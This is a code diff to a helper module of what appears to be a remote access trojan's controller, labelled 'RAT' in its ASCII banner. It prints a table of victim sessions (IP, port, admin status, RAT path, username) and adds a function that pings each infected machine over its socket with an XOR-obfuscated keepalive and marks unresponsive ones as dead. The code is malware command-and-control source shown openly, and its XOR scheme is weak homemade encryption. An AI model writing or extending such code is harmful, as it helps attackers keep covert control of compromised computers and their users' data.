@@ -8,8 +8,6 @@ import socket
 import binascii
 
 
-
-
 #CONSTANT:
 NB_SESSION = 0
 NB_SOCKET = 1
@@ -64,7 +62,6 @@ def exec(command):
             return err
 
 
-
 def printColor(status,message):
     ERROR_COLOR = "\033[31m" #red
     HELP_COLOR = "\033[35m" #magenra
@@ -90,7 +87,6 @@ def areYouSure():
 
     inp = str(input("YesOrNo> ")).lower()
     
-
     if(inp == "y" or inp == "yes"):
         return True
     
@@ -102,17 +98,46 @@ def areYouSure():
 
 
 def printAllTarget():
-    from .handler import Handler
     #Print all target.
+    from .handler import Handler
     
     ptable = PrettyTable() #Ascii tables dynamic.
     ptable.field_names =["Session","IP","Port","Is he alive","Is he admin","Path RAT","Username"] #append title of row.
 
     for key in Handler.dict_conn.keys():
-        #print("TETS BOOL_>",type(Handler.dict_conn[key][NB_ALIVE]),":",Handler.dict_conn[key][NB_ALIVE])
         ptable.add_row([key,Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT],Handler.dict_conn[key][NB_ALIVE],Handler.dict_conn[key][NB_ADMIN],Handler.dict_conn[key][NB_PATH],Handler.dict_conn[key][NB_USERNAME]])
 
     print(Fore.GREEN,(ptable),Fore.BLUE)
+
+
+def pingAllTarget(dict_conn,checkconn_objt , number_of_times=int() ,ping_string="is_life?"):
+    #ping all the machine is determines whether the machine is alive or dead. 
+    from .handler import Handler
+
+    for key in dict_conn.keys():
+                        
+        if(dict_conn[key][NB_ALIVE] ==True and dict_conn[key][NB_SOCKET] ==False):
+            print("\n\n\nChange value Is he alive true to false.")
+            dict_conn[key][NB_ALIVE] = False
+
+        #print("TEST SOCK--->",bool(Handler.dict_conn[key][NB_SOCKET]))
+    
+        if(dict_conn[key][NB_ALIVE] and bool(dict_conn[key][NB_SOCKET]) and not dict_conn[key][NB_SELECT]): #If the connection is alive (True) and the socket object is active (True)
+            try:
+                dict_conn[key][NB_SOCKET].send(XOREncryption(ping_string, Handler.PBKDF2_Key).encode())
+
+            except ConnectionError as connerr: #If the connection does not answer
+                if(Handler.status_connection_display):
+                    printColor("information","\n[-] Client number {} {}:{} was disconnected.".format(dict_conn[key][NB_SESSION], dict_conn[key][NB_IP], dict_conn[key][NB_PORT]))
+                    #printColor("error",str(connerr))
+                else:
+                    pass
+                checkconn_objt.connexionIsDead(key) #Change status to dead (False)
+
+        else:#If the connection is dead
+            #connexion is dead no send msg
+            pass
+
 
 def myBanner():
     return """
@@ -124,17 +149,6 @@ def myBanner():
  ░███    ░███  ░███    ░███     ░███               ░███░░░   ░███     ███    ░███░███░░░   ░███      ░░███ ███  ░███░░░   ░███     
  █████   █████ █████   █████    █████              ░░██████  █████   ░░█████████ ░░██████  █████      ░░█████   ░░██████  █████    
 ░░░░░   ░░░░░ ░░░░░   ░░░░░    ░░░░░                ░░░░░░  ░░░░░     ░░░░░░░░░   ░░░░░░  ░░░░░        ░░░░░     ░░░░░░  ░░░░░   BETA                                                                                                                                                                                                                                                                                                                
-"""
-
-
-def bannerCisco():
-    return """
-    __                  _               
-   / /_  __  __   _____(_)_____________ 
-  / __ \/ / / /  / ___/ / ___/ ___/ __ \\
- / /_/ / /_/ /  / /__/ (__  ) /__/ /_/ /
-/_.___/\__, /   \___/_/____/\___/\____/ 
-      /____/                                             
 """
 
 
